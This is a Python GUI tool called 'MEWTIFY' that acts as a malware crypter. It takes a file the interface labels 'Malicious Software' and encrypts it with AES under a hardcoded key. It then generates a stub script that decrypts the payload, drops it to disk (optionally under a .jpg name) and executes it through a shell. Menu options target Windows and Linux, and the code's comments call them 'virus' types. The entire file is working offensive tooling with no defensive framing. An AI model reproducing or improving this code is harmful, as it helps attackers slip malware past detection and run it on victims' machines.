#!/usr/bin/env python3
import tkinter as tk
import binascii, pyaes, sys, base64, os.path, os
from tkinter import *
from pathlib import Path
from tkinter.font import Font
from tkinter.filedialog import askopenfilename

def main():
    if choices==1:
        pythwin()
    if choices==2:
        pythlin()
    if choices==3:
        jpgwin()
    return

def pythwin():
    global entry3
    input2 = entry3.get()
    # Open file
    file_name = malwarename  # Malware path
    new_file_name = input2  # Path to drop file
    file = open(file_name, "rb")
    file_data = file.read()
    file.close()

    # Crypt file data (Using AES)
    key = bytearray("0123456789abcdef", 'UTF-8')  # 16 bytes key - change for your key
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # Create Stub in Python File
    stub = "import pyaes\n"
    stub += "import sys\n"
    stub += "crypto_data_hex = " + str(crypto_data) + "\n"
    stub += "key = " + str(key) + "\n"
    stub += "new_file_name = \"" + str(new_file_name) + "\"\n"
    stub += "aes = pyaes.AESModeOfOperationCTR(key)\n"
    stub += "crypto_data = crypto_data_hex\n"
    stub += "decrypt_data = aes.decrypt(crypto_data)\n"
    # Save file
    stub += "new_file = open(new_file_name, 'wb')\n"
    stub += "new_file.write(decrypt_data)\n"
    stub += "new_file.close()\n"
    # Execute file
    stub += "import subprocess\n"
    stub += 'proc = subprocess.Popen("python "+new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n'

    # Save the Stub
    stub_name = str(input2)
    stub_file = open(stub_name, "w")
    stub_file.write(stub)
    stub_file.close()

    return

def pythlin():
    global entry3
    input2 = entry3.get()
    # Open file
    file_name = malwarename  # Malware path
    new_file_name = input2  # Path to drop file
    file = open(file_name, "rb")
    file_data = file.read()
    file.close()

    # Crypt file data (Using AES)
    key = bytearray("0123456789abcdef", 'UTF-8')  # 16 bytes key - change for your key
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # Create Stub in Python File
    stub = "import pyaes\n"
    stub += "import sys\n"
    stub += "crypto_data_hex = " + str(crypto_data) + "\n"
    stub += "key = " + str(key) + "\n"
    stub += "new_file_name = \"" + str(new_file_name) + "\"\n"
    stub += "aes = pyaes.AESModeOfOperationCTR(key)\n"
    stub += "crypto_data = crypto_data_hex\n"
    stub += "decrypt_data = aes.decrypt(crypto_data)\n"
    # Save file
    stub += "new_file = open(new_file_name, 'wb')\n"
    stub += "new_file.write(decrypt_data)\n"
    stub += "new_file.close()\n"
    # Execute file
    stub += "import subprocess\n"
    stub += 'proc = subprocess.Popen("python3 "+new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n'

    # Save the Stub
    stub_name = str(input2)
    stub_file = open(stub_name, "w")
    stub_file.write(stub)
    stub_file.close()

    return

def jpgwin():
    global entry3
    input2 = entry3.get()
    # Open file
    file_name = malwarename  # Malware path
    new_file_name = input2+".jpg"  # Path to drop file
    file = open(file_name, "rb")
    file_data = file.read()
    file.close()

    # Crypt file data (Using AES)
    key = bytearray("0123456789abcdef", 'UTF-8')  # 16 bytes key - change for your key
    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    # Create Stub in Python File
    stub = "import pyaes\n"
    stub += "import sys\n"
    stub += "crypto_data_hex = " + str(crypto_data) + "\n"
    stub += "key = " + str(key) + "\n"
    stub += "new_file_name = \"" + str(new_file_name) + "\"\n"
    stub += "aes = pyaes.AESModeOfOperationCTR(key)\n"
    stub += "crypto_data = crypto_data_hex\n"
    stub += "decrypt_data = aes.decrypt(crypto_data)\n"
    # Save file
    stub += "new_file = open(new_file_name, 'wb')\n"
    stub += "new_file.write(decrypt_data)\n"
    stub += "new_file.close()\n"
    # Execute file
    stub += "import subprocess\n"
    stub += 'proc = subprocess.Popen(new_file_name, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n'

    # Save the Stub
    stub_name = str(input2)
    stub_file = open(stub_name, "w")
    stub_file.write(stub)
    stub_file.close()

    return


def fname():
    global malwarename
    malwarename = askopenfilename()
    return malwarename




# GUI Dimensions
HEIGHT = 500
WIDTH = 700
root = tk.Tk()
# GUI NAME AND SIZE
root.title("MEWTIFY")
canvas = tk.Canvas(root, height=HEIGHT, width=WIDTH)
canvas.pack()
background_image = tk.PhotoImage(file='yaj.png')
background_label = tk.Label(root, image=background_image)
background_label.image= background_image
background_label.place(relwidth=1,relheight=1)
root.resizable(False, False)

#Python windows virus
def x():
    global choices
    choices = 1
    return

#python Linux virus
def y():
    global choices
    choices = 2
    return
#JPEG windows virus
def z():
    global choices
    choices = 3
    return

menu = Menu(root)
root.config(menu=menu)
subMenu = Menu(menu)
menu.add_cascade(label="Type of target", menu=subMenu)
subMenu.add_command(label="Windows Python", command=x)
subMenu.add_command(label="Linux Python", command=y)
subMenu.add_command(label="Windows JPEG", command=z)
# GUI HEADER
frame = tk.Frame(root, bg='#80C1FF', bd=5)
frame.place(relx=0.5, rely=0.05, relwidth=1, relheight=0.2, anchor='n')
label = tk.Label(frame, text="Welcome to Mewtify!", font=("-weight bold", 27), bg='#80C1FF')
label.place(relx=0.3, rely=0, relwidth=.5, relheight=1)
# INPUT 1
label2 = tk.Label(root, text="Malicious Software with full path:", anchor='w', font=15)
label2.place(relx=0, rely=0.35, relwidth=0.4, relheight=0.10)
filebutton = tk.Button(root, text="Select", font=40, command=fname)
filebutton.place(relx=.5, rely=0.35, relwidth=0.45, relheight=0.09)
# INPUT2
label3 = tk.Label(root, text="Name of Mutated Software:", anchor='w', font=15)
label3.place(relx=0, rely=0.5, relwidth=0.4, relheight=0.10)
entry3 = tk.Entry(root, font=40)
entry3.place(relx=.5, rely=0.5, relwidth=0.45, relheight=0.09)
entry3.focus_set()
# button mashing
button = tk.Button(root, text="MEWTIFY", bg="purple", font=40, command=main)
button.place(relx=0.3, rely=0.8, relwidth=0.45, relheight=0.15)
button1=tk.Button(root, text="click to exit", bg= "red", font =10,command=root.destroy)
button1.place(relx=.8, rely=0.9, relwidth=0.15, relheight=0.05)

root.mainloop()
